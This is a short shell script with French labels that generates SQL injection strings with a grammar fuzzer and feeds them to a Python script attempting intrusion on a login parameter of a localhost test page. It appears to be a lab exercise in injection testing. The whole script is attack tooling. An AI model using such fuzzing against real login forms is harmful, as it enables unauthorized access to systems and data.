rm /tmp/injectionssql /tmp/requete 2> /dev/null
echo "===ELABORATION DE LA REQUETE==="
echo "select _ <etoile> _ from _ <name> _ where _ <name> = ' [X] '" > /tmp/requete
echo "===GENERATION DES INJECTIONS==="
./fuzzer grammaires/sql.gr S requetes.req | grep "Mot : " | sed "s/Mot\ :\ //g" | sed "s/<str>/string/g" | sed "s/<name>/login/g" | sed "s/<int>/42/g" | sed "s/_/\ /g"| sed "s/<etoile>/\*/g" > /tmp/injectionssql
echo "====TENTATIVES D' INTRUSION===="
python injectBash.py -m --param=admin --input=/tmp/injectionssql --arg=pass --url=http://localhost/injections/index.php


